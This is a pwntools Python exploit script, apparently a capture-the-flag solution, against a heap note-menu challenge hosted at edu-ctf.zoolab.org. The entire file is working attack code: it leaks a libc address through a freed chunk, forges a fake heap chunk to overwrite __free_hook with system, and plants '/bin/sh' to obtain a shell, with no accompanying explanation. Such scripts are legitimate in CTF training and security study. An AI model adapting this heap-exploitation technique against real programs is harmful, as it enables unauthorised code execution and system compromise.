from pwn import *
context.arch='amd64'
context.terminal=['tmux','splitw','-h']
# r=process("./chal")
r=remote("edu-ctf.zoolab.org",10007)
# gdb.attach(r)
def add(idx,name):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'1')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('note name\n> ')
    r.sendline(str(name))
    r.recvuntil('success!\n')

def edit(idx,size,data):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'2')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('size\n> ')
    r.sendline(str(size))
    r.sendline(data)
    r.recvuntil('success!\n')

def delete(idx):
    r.recvuntil('5. bye\n> ')
    r.sendline(b'3')
    r.recvuntil('index\n> ')
    r.sendline(str(idx))
    r.recvuntil('success!\n')

def show():
    r.recvuntil('5. bye\n> ')
    r.sendline(b'4')


add(0,'A'*8)
edit(0,0x418,'A')

add(1,'B'*8)
edit(1,0x18,'B')

add(2,'C'*8)
delete(0)
show()

r.recvuntil('data: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
print(hex(libc))
free_hook = libc + 0x1eee48
system = libc + 0x52290
info(f"libc: {hex(libc)}")

fake_chunk = flat(
    0,  0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook,
)
data = b'/bin/sh\x00'.ljust(0x10, b'B')
edit(1,0x38,data + fake_chunk)
edit(2, 0x8, p64(system))
# delete(1)
r.interactive()